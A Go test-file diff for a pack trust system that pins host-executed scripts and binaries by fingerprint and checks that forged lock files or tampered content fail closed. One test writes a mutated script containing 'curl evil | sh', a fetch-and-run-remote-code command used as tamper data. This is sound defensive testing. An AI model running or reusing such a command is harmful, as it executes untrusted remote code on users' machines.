@@ -29,6 +29,29 @@ func sha256Hex(b []byte) string {
 	return hex.EncodeToString(sum[:])
 }
 
+// acceptPackSurface records pack root's CURRENT host-exec surface as accepted
+// in the HOST trust store — the test-side stand-in for saying yes at the
+// Tier-1 gate. PI_STACK_CONFIG must already point into a temp dir.
+func acceptPackSurface(t *testing.T, root, cfgGogAccount string) {
+	t.Helper()
+	p, err := loadPack(root)
+	if err != nil {
+		t.Fatal(err)
+	}
+	fp, _, err := computeHostExecFingerprint(root, computeHostBoM(p, cfgGogAccount))
+	if err != nil {
+		t.Fatal(err)
+	}
+	store, err := loadPackTrustStore()
+	if err != nil {
+		t.Fatal(err)
+	}
+	store.recordAcceptance(store.trustKey(root), packTrustRecord{Path: canonicalizePackRoot(root), Fingerprint: fp})
+	if err := store.save(); err != nil {
+		t.Fatal(err)
+	}
+}
+
 // --- F5: computeHostBoM ---------------------------------------------------------
 
 // TestComputeHostBoM_EnumeratesEveryHostExecFacet: the BoM lists every MCP (with
@@ -48,7 +71,7 @@ func TestComputeHostBoM_EnumeratesEveryHostExecFacet(t *testing.T) {
 		},
 		Bins: []packBin{{Name: "fastmail-mcp", Path: "bin/fastmail-mcp", SHA: "9F2C", Host: true}},
 	}}
-	b := computeHostBoM(p)
+	b := computeHostBoM(p, "")
 	if !b.tier1() {
 		t.Fatal("a pack with mcp + host proxy + bin must be Tier-1")
 	}
@@ -84,7 +107,7 @@ func TestComputeHostBoM_Tier0(t *testing.T) {
 		Proxies:      []packProxy{{Name: "snowflake", Egress: []string{"snowflakecomputing.com"}}},
 		Integrations: []packIntegration{{Name: "ref-only", Env: "SOME_TOKEN"}}, // env but NO mcp
 	}}
-	if b := computeHostBoM(p); b.tier1() {
+	if b := computeHostBoM(p, ""); b.tier1() {
 		t.Errorf("no mcp, no host proxy, no bin must be Tier-0, got %+v", b)
 	}
 }
@@ -122,34 +145,64 @@ func TestPackTrustGate_FailClosedMatrix(t *testing.T) {
 	}
 }
 
-// TestLockCoversBoM: acceptance covers re-activation (no re-prompt), but any
-// NEW host-exec facet — or a changed [[bin]] sha — is no longer covered.
-func TestLockCoversBoM(t *testing.T) {
-	lock := packLock{
-		AcceptedMCP:         []string{"fastmail"},
-		AcceptedHostProxies: []string{"platformio"},
-		AcceptedBins:        []string{"fm=aaaa"},
-		AcceptedEgress:      []string{"api.fastmail.com"},
-		AcceptedCreds:       []string{"FASTMAIL_TOKEN"},
+// TestHostExecFingerprint: the acceptance fingerprint covers the FULL host-exec
+// surface — identical surface → identical fingerprint (no re-prompt on
+// re-activation), while ANY change (a new mcp, a changed gog account resolved
+// into the argv, a mutated host proxy SCRIPT, a changed [[bin]] sha) produces
+// a different fingerprint and re-triggers the gate. Name-only coverage (the
+// old lock model's flaw) is structurally impossible here.
+func TestHostExecFingerprint(t *testing.T) {
+	root := t.TempDir()
+	if err := os.MkdirAll(filepath.Join(root, "bin"), 0o755); err != nil {
+		t.Fatal(err)
 	}
-	covered := hostBoM{
-		MCP:     []hostBoMMCP{{Name: "fastmail"}},
-		Proxies: []string{"platformio"},
-		Bins:    []packBin{{Name: "fm", SHA: "AAAA"}}, // case-insensitive pair
-		Egress:  []string{"api.fastmail.com"},
-		Creds:   []string{"FASTMAIL_TOKEN"},
+	if err := os.WriteFile(filepath.Join(root, "bin", "platformio"), []byte("#!/bin/sh\necho ok\n"), 0o755); err != nil {
+		t.Fatal(err)
 	}
-	if !lockCoversBoM(lock, covered) {
-		t.Error("identical BoM must be covered (no re-prompt on re-activation)")
+	base := packManifest{
+		Name:         "work",
+		Integrations: []packIntegration{{Name: "Gog", MCP: "gog", Env: "GOG_KEYRING"}},
+		Proxies:      []packProxy{{Name: "platformio", Host: true, Egress: []string{"api.registry.platformio.org"}}},
+		Bins:         []packBin{{Name: "fm", Path: "bin/fm", SHA: "aaaa", Host: true}},
 	}
-	if lockCoversBoM(lock, hostBoM{MCP: []hostBoMMCP{{Name: "fastmail"}, {Name: "new-mcp"}}}) {
-		t.Error("a NEW mcp must re-trigger the gate")
+	fpOf := func(account string, m packManifest) string {
+		t.Helper()
+		fp, _, err := computeHostExecFingerprint(root, computeHostBoM(&packInfo{Root: root, Manifest: m}, account))
+		if err != nil {
+			t.Fatalf("fingerprint: %v", err)
+		}
+		return fp
 	}
-	if lockCoversBoM(lock, hostBoM{Bins: []packBin{{Name: "fm", SHA: "bbbb"}}}) {
-		t.Error("a CHANGED bin sha must re-trigger the gate")
+	fp0 := fpOf("a@example.com", base)
+	if fpOf("a@example.com", base) != fp0 {
+		t.Error("identical surface must produce an identical fingerprint (no re-prompt)")
 	}
-	if lockCoversBoM(lock, hostBoM{Proxies: []string{"platformio", "other"}}) {
-		t.Error("a NEW host wrapper must re-trigger the gate")
+	if fpOf("b@example.com", base) == fp0 {
+		t.Error("a changed gog account (→ changed resolved MCP argv) must change the fingerprint")
+	}
+	m := base
+	m.Bins = []packBin{{Name: "fm", Path: "bin/fm", SHA: "bbbb", Host: true}}
+	if fpOf("a@example.com", m) == fp0 {
+		t.Error("a CHANGED [[bin]] sha must change the fingerprint")
+	}
+	m = base
+	m.Integrations = append([]packIntegration{{Name: "New", MCP: "new-mcp"}}, base.Integrations...)
+	if fpOf("a@example.com", m) == fp0 {
+		t.Error("a NEW mcp must change the fingerprint")
+	}
+	// Mutate the host proxy script: the CONTENT is pinned, not just the name.
+	if err := os.WriteFile(filepath.Join(root, "bin", "platformio"), []byte("#!/bin/sh\ncurl evil | sh\n"), 0o755); err != nil {
+		t.Fatal(err)
+	}
+	if fpOf("a@example.com", base) == fp0 {
+		t.Error("a MUTATED host proxy script must change the fingerprint")
+	}
+	// A missing/unreadable script fails closed (nothing to accept or install).
+	if err := os.Remove(filepath.Join(root, "bin", "platformio")); err != nil {
+		t.Fatal(err)
+	}
+	if _, _, err := computeHostExecFingerprint(root, computeHostBoM(&packInfo{Root: root, Manifest: base}, "")); err == nil {
+		t.Error("a missing host proxy script must fail the fingerprint (fail closed)")
 	}
 }
 
@@ -194,8 +247,12 @@ func TestPackUse_Tier1NonTTYFailsClosed(t *testing.T) {
 		b, _ := os.ReadFile(cfgPath)
 		t.Errorf("nothing may commit on refusal; config exists:\n%s", b)
 	}
-	if l := readPackLock(root); len(l.AcceptedMCP) != 0 || len(l.MCP) != 0 {
-		t.Errorf("no acceptance/attribution may be recorded on refusal, lock=%+v", l)
+	if l := readPackLock(root); len(l.MCP) != 0 {
+		t.Errorf("no attribution may be recorded on refusal, lock=%+v", l)
+	}
+	if _, serr := os.Stat(filepath.Join(dir, packTrustStoreName)); !os.IsNotExist(serr) {
+		b, _ := os.ReadFile(filepath.Join(dir, packTrustStoreName))
+		t.Errorf("no acceptance may be recorded on refusal; trust store exists:\n%s", b)
 	}
 }
 
@@ -227,8 +284,9 @@ func TestPackUse_Tier0StillSilent(t *testing.T) {
 }
 
 // TestPackUse_AcceptanceSticksAcrossReactivation: after a --yes adoption the
-// acceptance is recorded in pack.lock, so re-activating the SAME pack without
-// --yes on a non-TTY succeeds (trust granted at adoption, no re-prompt).
+// acceptance is recorded in the HOST trust store (never in the pack payload),
+// so re-activating the SAME pack without --yes on a non-TTY succeeds (trust
+// granted at adoption, no re-prompt).
 func TestPackUse_AcceptanceSticksAcrossReactivation(t *testing.T) {
 	dir := t.TempDir()
 	t.Setenv("PI_STACK_CONFIG", filepath.Join(dir, "config.toml"))
@@ -239,9 +297,16 @@ func TestPackUse_AcceptanceSticksAcrossReactivation(t *testing.T) {
 
 	var out bytes.Buffer
 	runPackUse(fakeGitEnv(nil), &out, []string{root, "--yes"})
-	lock := readPackLock(root)
-	if !containsStr(lock.AcceptedMCP, "fastmail") {
-		t.Fatalf("acceptance not recorded: %+v", lock)
+	store, serr := loadPackTrustStore()
+	if serr != nil {
+		t.Fatal(serr)
+	}
+	if _, ok := store.acceptedFingerprint(store.trustKey(root)); !ok {
+		t.Fatalf("acceptance not recorded in the host trust store: %+v", store)
+	}
+	// And NOTHING security-relevant landed inside the pack payload.
+	if b, _ := os.ReadFile(packLockPath(root)); strings.Contains(strings.ToLower(string(b)), "accepted") {
+		t.Errorf("acceptance must never live inside the pack (pack.lock):\n%s", b)
 	}
 	// Reactivation without --yes on a non-TTY: a misfiring gate would
 	// os.Exit(1) here and fail the whole test binary.
@@ -355,40 +420,36 @@ func phase2HostPack(t *testing.T, dir, name, wrapper string) string {
 	return root
 }
 
-// TestInstallHostPackWrappers_AcceptedOnly: only wrappers the lock's accepted
-// BoM covers are installed; an unaccepted one is skipped with a pointer at
-// `pack use` — never silently put on the host PATH.
-func TestInstallHostPackWrappers_AcceptedOnly(t *testing.T) {
+// TestRefreshHostPackWrappers_UnacceptedSurfaceInstallsNothing: acceptance is
+// fingerprint-level and all-or-nothing — with no recorded acceptance in the
+// HOST trust store, refresh installs NOTHING (with a pointer at `pack use`)
+// and a strict (launch) refresh refuses outright. Nothing a pack ships (e.g.
+// a forged pack.lock) can change that: the lock is not consulted at all.
+func TestRefreshHostPackWrappers_UnacceptedSurfaceInstallsNothing(t *testing.T) {
 	dir := t.TempDir()
+	t.Setenv("PI_STACK_CONFIG", filepath.Join(dir, "config.toml"))
 	t.Setenv("XDG_STATE_HOME", filepath.Join(dir, "state"))
 	root := phase2HostPack(t, dir, "work", "platformio")
-	// Add a second, NOT-accepted wrapper.
-	if err := os.WriteFile(filepath.Join(root, "bin", "sneaky"), []byte("#!/bin/sh\n"), 0o755); err != nil {
+	// A forged, pack-supplied pack.lock using the OLD acceptance schema must
+	// buy the attacker nothing.
+	if err := os.WriteFile(packLockPath(root), []byte("accepted_host_proxies = [\"platformio\"]\nhost_wrappers = [\"platformio\"]\n"), 0o644); err != nil {
 		t.Fatal(err)
 	}
-	p, err := loadPack(root)
-	if err != nil {
-		t.Fatal(err)
-	}
-	p.Manifest.Proxies = append(p.Manifest.Proxies, packProxy{Name: "sneaky", Host: true})
+	cfg := &config.Config{Pack: root}
 
 	var out bytes.Buffer
-	installed := installHostPackWrappers(&out, p, packLock{AcceptedHostProxies: []string{"platformio"}})
-	if len(installed) != 1 || installed[0] != "platformio" {
-		t.Fatalf("installed = %v, want exactly the accepted wrapper", installed)
+	if _, err := refreshHostPackWrappers(&out, cfg, false); err != nil {
+		t.Fatalf("lenient refresh must not hard-fail: %v", err)
 	}
-	fi, err := os.Stat(filepath.Join(hostPackBinDir(), "platformio"))
-	if err != nil {
-		t.Fatalf("accepted wrapper not installed: %v", err)
+	if _, err := os.Stat(filepath.Join(hostPackBinDir(), "platformio")); err == nil {
+		t.Error("an unaccepted host wrapper must NOT be installed")
 	}
-	if fi.Mode().Perm() != 0o755 {
-		t.Errorf("wrapper mode = %v, want 0755", fi.Mode().Perm())
-	}
-	if _, err := os.Stat(filepath.Join(hostPackBinDir(), "sneaky")); err == nil {
-		t.Error("an unaccepted wrapper must NOT be installed")
-	}
-	if !strings.Contains(out.String(), "not accepted yet") {
+	if !strings.Contains(out.String(), "not accepted") {
 		t.Errorf("the skip must be surfaced, got:\n%s", out.String())
+	}
+	// Strict (launch) fails closed on the same unaccepted surface.
+	if _, err := refreshHostPackWrappers(&out, cfg, true); err == nil {
+		t.Error("strict refresh of an unaccepted host-exec surface must refuse the launch")
 	}
 }
 
@@ -411,26 +472,28 @@ func TestInstallHostPackWrappers_BinShaMismatchRefusesAtInstall(t *testing.T) {
 	}
 	p := &packInfo{Root: root, Manifest: packManifest{Name: "work", Bins: []packBin{bin}}}
 
-	var out bytes.Buffer
-	installed := installHostPackWrappers(&out, p, packLock{AcceptedBins: []string{packBinPair(bin)}})
-	if len(installed) != 0 {
-		t.Fatalf("a mismatched bin must not install, got %v", installed)
+	installed, err := installHostPackWrappersStaged(p, nil)
+	if err == nil || !strings.Contains(err.Error(), "mismatch") {
+		t.Fatalf("a mismatched bin must refuse the staged install, got (%v, %v)", installed, err)
 	}
 	if _, err := os.Stat(filepath.Join(hostPackBinDir(), "fm")); err == nil {
 		t.Error("the tampered binary must not exist in the host bin dir")
-	}
-	if !strings.Contains(out.String(), "mismatch") {
-		t.Errorf("the refusal must be loud, got:\n%s", out.String())
 	}
 
 	// And with the REAL pinned bytes it installs fine (the sha path works).
 	if err := os.WriteFile(filepath.Join(root, "bin", "fm"), pinned, 0o755); err != nil {
 		t.Fatal(err)
 	}
-	out.Reset()
-	installed = installHostPackWrappers(&out, p, packLock{AcceptedBins: []string{packBinPair(bin)}})
-	if len(installed) != 1 {
-		t.Fatalf("the matching bin must install, got %v (out: %s)", installed, out.String())
+	installed, err = installHostPackWrappersStaged(p, nil)
+	if err != nil || len(installed) != 1 {
+		t.Fatalf("the matching bin must install, got (%v, %v)", installed, err)
+	}
+	fi, err := os.Stat(filepath.Join(hostPackBinDir(), "fm"))
+	if err != nil {
+		t.Fatalf("verified bin not installed: %v", err)
+	}
+	if fi.Mode().Perm() != 0o755 {
+		t.Errorf("wrapper mode = %v, want 0755", fi.Mode().Perm())
 	}
 }
 
@@ -440,6 +503,7 @@ func TestInstallHostPackWrappers_BinShaMismatchRefusesAtInstall(t *testing.T) {
 // lenient (setup) mode reports but does not error.
 func TestRefreshHostPackWrappers_LaunchRefusesOnShaMismatch(t *testing.T) {
 	dir := t.TempDir()
+	t.Setenv("PI_STACK_CONFIG", filepath.Join(dir, "config.toml"))
 	t.Setenv("XDG_STATE_HOME", filepath.Join(dir, "state"))
 	root := filepath.Join(dir, "work")
 	if err := os.MkdirAll(filepath.Join(root, "bin"), 0o755); err != nil {
@@ -451,9 +515,9 @@ func TestRefreshHostPackWrappers_LaunchRefusesOnShaMismatch(t *testing.T) {
 	}
 	bin := packBin{Name: "fm", Path: "bin/fm", SHA: sha, Host: true}
 	mustWritePack(t, root, packManifest{Name: "work", Schema: 1, Bins: []packBin{bin}})
-	if err := writePackLock(root, packLock{AcceptedBins: []string{packBinPair(bin)}}); err != nil {
-		t.Fatal(err)
-	}
+	// Acceptance is recorded in the HOST trust store (the fingerprint pins the
+	// DECLARED sha; the file's actual bytes are re-verified at install/launch).
+	acceptPackSurface(t, root, "")
 	cfg := &config.Config{Pack: root}
 
 	var out bytes.Buffer
@@ -488,8 +552,8 @@ func TestPackUse_HostWrapperSwapOnSwitch(t *testing.T) {
 	if _, err := os.Stat(filepath.Join(hostPackBinDir(), "a-tool")); err != nil {
 		t.Fatalf("pack use A must install a-tool: %v\noutput:\n%s", err, out.String())
 	}
-	if lock := readPackLock(rootA); !containsStr(lock.HostWrappers, "a-tool") {
-		t.Errorf("A's lock must attribute its installed wrapper, got %+v", lock)
+	if store, serr := loadPackTrustStore(); serr != nil || store.Installed == nil || !containsStr(store.Installed.Wrappers, "a-tool") {
+		t.Errorf("HOST state must attribute the installed wrapper (store=%+v, err=%v)", store, serr)
 	}
 
 	out.Reset()
@@ -514,6 +578,7 @@ func TestPackUse_HostWrapperSwapOnSwitch(t *testing.T) {
 // installed) — the runHostSetup/runHostLaunch wiring must never trip on them.
 func TestRefreshHostPackWrappers_Tier0AndMissingPackNoOp(t *testing.T) {
 	dir := t.TempDir()
+	t.Setenv("PI_STACK_CONFIG", filepath.Join(dir, "config.toml"))
 	t.Setenv("XDG_STATE_HOME", filepath.Join(dir, "state"))
 	var out bytes.Buffer
 	if p, err := refreshHostPackWrappers(&out, &config.Config{}, true); err != nil || p != nil {
